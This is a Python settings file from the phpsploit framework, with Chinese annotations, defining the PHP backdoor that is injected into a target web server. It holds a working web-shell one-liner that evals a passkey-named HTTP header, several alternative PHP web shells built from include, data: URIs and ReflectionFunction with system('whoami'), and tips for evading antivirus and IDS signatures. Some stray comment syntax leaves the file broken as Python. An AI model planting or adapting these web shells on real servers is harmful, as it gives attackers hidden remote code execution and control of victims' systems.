"""
This setting allows overriding default backdoor template.
It is used to generate the backdoor to be injected in TARGET url.

This setting can be changed to improve stealth. Using a different
template than the default one is a good was to bypass static
Antivirus/IDS signatures.

Make sure that the global behavior remains the same.
Indeed, BACKDOOR must evaluate the content of 'HTTP_%%PASSKEY%%'
header to work properly.

NOTE: %%PASSKEY%% is a magic string that is replaced by PASSKEY
      value at runtime.

* Only edit BACKDOOR if you really understand what you're doing
"""
import linebuf
import datatypes


linebuf_type = linebuf.RandLineBuffer


def validator(value):
    if value.find("%%PASSKEY%%") < 0:
        raise ValueError("shall contain %%PASSKEY%% string")
    return datatypes.PhpCode(value)

"""
1.替代eval 关键字的方式之一
<?php
function update($phpCode) {
    $tmpfname = tempnam("/tmp", "update");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}
extract(update($_REQUEST["c"]));

<?php
function cc(){
    global $b;
    $a =$_GET[$b];  //此处可改成POST方式
    $str =$a;
    return $str;
}
$b="url";
$c=cc();
$aa = $c;
include($aa); include.php?url=data:image/png;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==

2.使用php扩展
https://github.com/phith0n/arbitrary-php-extension


3.使用反射
<?php
class test extends ReflectionFunction {}
$f = new test($_GET['c']);
$f->invoke($_GET['m']);
https://xxxxx.com/1.php?c=assert&m=system('whoami');


所有shell都可以使用use function a as b，或者添加0x00-0x20
<script language="php"></script> php7后移除
*/
"""

//phpsploit 主要通过eval/assert执行代码方式，这个backdoor是执行head中phpcode，然后header会执行post过来真正要执行操作的phpcode
def default_value():
    return("@eval($_SERVER['HTTP_%%PASSKEY%%']);")
